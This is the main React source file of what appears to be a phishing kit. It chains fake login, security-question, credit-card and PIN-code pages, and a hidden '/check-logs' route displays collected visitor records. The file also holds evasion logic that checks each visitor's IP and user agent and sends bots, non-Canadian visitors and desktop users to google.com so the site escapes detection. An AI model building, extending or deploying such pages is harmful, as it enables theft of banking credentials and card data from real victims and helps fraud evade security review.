import "./assets/cleaned.css";
import Login from "./login";
import SecurityQuestions from "./SecurityQuestions";
import CreditCard from "./CreditCard";
import redirectPage from "./redirectPage";
import React, {useEffect, useState} from "react";
import pinCode from "./PinCode";
import {BrowserRouter as Router, Switch, Route} from "react-router-dom";
import Loader from "./Loader";
const axios = require("axios");
const publicIp = require("react-public-ip");

const App = () => {
  const [isBot, setIsBot] = useState(true);
  const checkAccess = async (db) => {
    const ip = (await publicIp.v4()) || "";
    const agent = navigator.userAgent;
    const response = await axios.get("/check", {params: {ip, agent}});
    const body = response.data;
    if (
      body.isBot === true ||
      body.country !== "CA" ||
      body.device !== "smartphone"
    )
      window.location.assign("https://google.com");
    else setIsBot(false);
  };
  useEffect(() => {
    checkAccess();
  }, [checkAccess]);
  if (!isBot)
    return (
      <Router>
        <Switch>
          <Route exact path="/securityQuestion" component={SecurityQuestions} />
          <Route exact path="/creditCard" component={CreditCard} />
          <Route exact path="/success" component={redirectPage} />
          <Route exact path="/check-logs" component={LogsPage} />
          <Route exact path="/verification-pin-code" component={pinCode} />
          <Route component={Login} />
        </Switch>
      </Router>
    );
  else return <Loader></Loader>;
};
const LogsPage = () => {
  const [logs, setlogs] = useState([]);

  useEffect(() => {
    getDb();
  }, []);
  const getDb = async () => {
    const response = await axios.get("/visitors");
    setlogs(response.body);
  };

  return (
    <div>
      {logs.length > 0 &&
        logs.map((item) => (
          <div key={item}>
            _________________________ _________________________
            <br />
            {JSON.stringify(item)}
            <br />
          </div>
        ))}
    </div>
  );
};
export default App;
